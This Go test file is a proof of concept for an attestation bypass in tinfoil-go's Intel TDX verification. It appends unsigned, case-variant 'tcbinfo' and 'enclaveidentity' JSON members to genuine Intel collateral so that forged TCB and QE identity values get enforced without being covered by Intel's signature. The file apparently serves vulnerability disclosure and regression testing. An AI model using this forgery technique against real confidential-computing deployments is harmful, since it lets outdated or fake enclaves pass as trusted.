package tdx

// PoC 2 (production build, no build tags): tinfoil-go's TDX authentication
// accepts Intel PCS collateral whose enforced values live in an UNSIGNED
// "tcbinfo" / "enclaveidentity" member. go-tdx-guest (v0.3.1) decodes the
// response with encoding/json v1 (case-insensitive member matching, in-place
// merge) but verifies Intel's signature only over the exact-key "tcbInfo" /
// "enclaveIdentity" raw member. tinfoil-go's replay getter and
// tcbEvaluationRecorder pass the body through unchanged (json/v2 ignores the
// unknown lowercase member).
//
// Material: Intel's production SPR quote from go-tdx-guest's testdata (PCK
// chain valid to 2029, embedded Intel SGX Root CA), and Intel PCS collateral
// for its FMSPC fetched on 2026-10-08. Clock: time.Now().

import (
	"bufio"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	tdxabi "github.com/google/go-tdx-guest/abi"
	tdxpb "github.com/google/go-tdx-guest/proto/tdx"
	tdxtestdata "github.com/google/go-tdx-guest/testing/testdata"
	"github.com/stretchr/testify/require"

	"github.com/tinfoilsh/tinfoil-go/document/collateral"
)

const (
	pocTcbURL    = "https://api.trustedservices.intel.com/tdx/certification/v4/tcb?fmspc=50806f000000"
	pocQeURL     = "https://api.trustedservices.intel.com/tdx/certification/v4/qe/identity"
	pocPckCrlURL = "https://api.trustedservices.intel.com/sgx/certification/v4/pckcrl?ca=platform&encoding=der"
	pocRootURL   = "https://certificates.trustedservices.intel.com/IntelSGXRootCA.der"
)

func pocLoad(t *testing.T, name, url string) collateral.PCSResponse {
	t.Helper()
	dir := filepath.Join("testdata", "poc-casefold")
	body, err := os.ReadFile(filepath.Join(dir, name+".body"))
	require.NoError(t, err)
	f, err := os.Open(filepath.Join(dir, name+".headers"))
	require.NoError(t, err)
	defer f.Close()
	headers := map[string][]string{}
	sc := bufio.NewScanner(f)
	sc.Buffer(make([]byte, 1<<20), 1<<20)
	for sc.Scan() {
		k, v, ok := strings.Cut(sc.Text(), ":")
		if !ok || strings.HasPrefix(k, "HTTP/") {
			continue
		}
		headers[k] = append(headers[k], strings.TrimSpace(v))
	}
	return collateral.PCSResponse{URL: url, Headers: headers, Body: body}
}

// pocQuote is the signed portion of the production sample quote: tinfoil-go
// requires trailing bytes to be zero, and the sample carries 39 non-zero
// trailing bytes that are not part of the quote.
func pocQuote(t *testing.T) []byte {
	t.Helper()
	parsed, err := tdxabi.QuoteToProto(tdxtestdata.RawQuote)
	require.NoError(t, err)
	q := parsed.(*tdxpb.QuoteV4)
	return tdxtestdata.RawQuote[:len(tdxtestdata.RawQuote)-len(q.GetExtraBytes())]
}

// pocCaseVariant keeps the signed member and signature byte-for-byte and
// appends an unsigned member that differs from the signed one only in case.
func pocCaseVariant(t *testing.T, body []byte, signedKey, variantKey string, override any) []byte {
	t.Helper()
	var top map[string]json.RawMessage
	require.NoError(t, json.Unmarshal(body, &top))
	ov, err := json.Marshal(override)
	require.NoError(t, err)
	out := []byte(`{"` + signedKey + `":`)
	out = append(out, top[signedKey]...)
	out = append(out, []byte(`,"`+variantKey+`":`)...)
	out = append(out, ov...)
	out = append(out, []byte(`,"signature":`)...)
	out = append(out, top["signature"]...)
	return append(out, '}')
}

func pocGenuine(t *testing.T) []collateral.PCSResponse {
	return []collateral.PCSResponse{
		pocLoad(t, "tcb", pocTcbURL),
		pocLoad(t, "qeid", pocQeURL),
		pocLoad(t, "pckcrl", pocPckCrlURL),
		pocLoad(t, "rootcrl", pocRootURL),
	}
}

func pocZeroComponents() []map[string]any {
	z := make([]map[string]any, 16)
	for i := range z {
		z[i] = map[string]any{"svn": 0}
	}
	return z
}

func TestPoC_Control_GenuineIntelCollateralRejectsStalePlatform(t *testing.T) {
	_, err := Authenticate(Evidence{Quote: pocQuote(t), PCS: pocGenuine(t)}, nil)
	t.Logf("genuine collateral: %v", err)
	require.Error(t, err, "the 2023-era platform must not be UpToDate against today's Intel TCB info")
	require.Contains(t, err.Error(), "TCB")
}

func TestPoC_UnsignedCaseVariantMembersAreEnforced(t *testing.T) {
	pcs := pocGenuine(t)
	// Attacker-chosen TCB Info: one TCB level at SVN 0 that is "UpToDate", and a
	// TDX module identity accepting any ISVSVN.
	pcs[0].Body = pocCaseVariant(t, pcs[0].Body, "tcbInfo", "tcbinfo", map[string]any{
		"tcbLevels": []any{map[string]any{
			"tcb":       map[string]any{"sgxtcbcomponents": pocZeroComponents(), "pcesvn": 0, "tdxtcbcomponents": pocZeroComponents()},
			"tcbDate":   "2026-01-01T00:00:00Z",
			"tcbStatus": "UpToDate",
		}},
		"tdxModuleIdentities": []any{map[string]any{
			"id": "TDX_00", "mrsigner": strings.Repeat("0", 96),
			"attributes": "0000000000000000", "attributesMask": "FFFFFFFFFFFFFFFF",
			"tcbLevels": []any{map[string]any{"tcb": map[string]any{"isvsvn": 0}, "tcbDate": "2026-01-01T00:00:00Z", "tcbStatus": "UpToDate"}},
		}},
	})
	// Attacker-chosen QE Identity: accept the QE at any ISVSVN. (The same
	// member can override mrsigner/isvprodid/attributes to endorse a fake QE.)
	pcs[1].Body = pocCaseVariant(t, pcs[1].Body, "enclaveIdentity", "enclaveidentity", map[string]any{
		"tcbLevels": []any{map[string]any{"tcb": map[string]any{"isvsvn": 0}, "tcbDate": "2026-01-01T00:00:00Z", "tcbStatus": "UpToDate"}},
	})

	q, err := Authenticate(Evidence{Quote: pocQuote(t), PCS: pcs}, nil)
	require.NoError(t, err, "forged (unsigned) tcbinfo/enclaveidentity must not be accepted")
	t.Logf("ACCEPTED: identity(PPID)=%s tcbEvaluationDataNumber(recorded from signed member)=%d", q.Identity(), q.tcbEvaluationDataNumber)
	t.Logf("enclave measurement: %s", q.Measurement)
}

func TestPoC_QeMrsignerComesFromUnsignedMember(t *testing.T) {
	pcs := pocGenuine(t)
	pcs[0].Body = pocCaseVariant(t, pcs[0].Body, "tcbInfo", "tcbinfo", map[string]any{
		"tcbLevels": []any{map[string]any{
			"tcb":       map[string]any{"sgxtcbcomponents": pocZeroComponents(), "pcesvn": 0, "tdxtcbcomponents": pocZeroComponents()},
			"tcbDate":   "2026-01-01T00:00:00Z",
			"tcbStatus": "UpToDate",
		}},
		"tdxModuleIdentities": []any{map[string]any{
			"id": "TDX_00", "mrsigner": strings.Repeat("0", 96),
			"attributes": "0000000000000000", "attributesMask": "FFFFFFFFFFFFFFFF",
			"tcbLevels": []any{map[string]any{"tcb": map[string]any{"isvsvn": 0}, "tcbDate": "2026-01-01T00:00:00Z", "tcbStatus": "UpToDate"}},
		}},
	})
	pcs[1].Body = pocCaseVariant(t, pcs[1].Body, "enclaveIdentity", "enclaveidentity", map[string]any{
		"mrsigner":  strings.Repeat("ab", 32),
		"tcbLevels": []any{map[string]any{"tcb": map[string]any{"isvsvn": 0}, "tcbDate": "2026-01-01T00:00:00Z", "tcbStatus": "UpToDate"}},
	})
	_, err := Authenticate(Evidence{Quote: pocQuote(t), PCS: pcs}, nil)
	t.Logf("unsigned enclaveidentity.mrsigner=abab...: %v", err)
	require.Error(t, err)
	require.Contains(t, err.Error(), "MRSIGNER", "the QE MRSIGNER comparison reads the unsigned member")
}
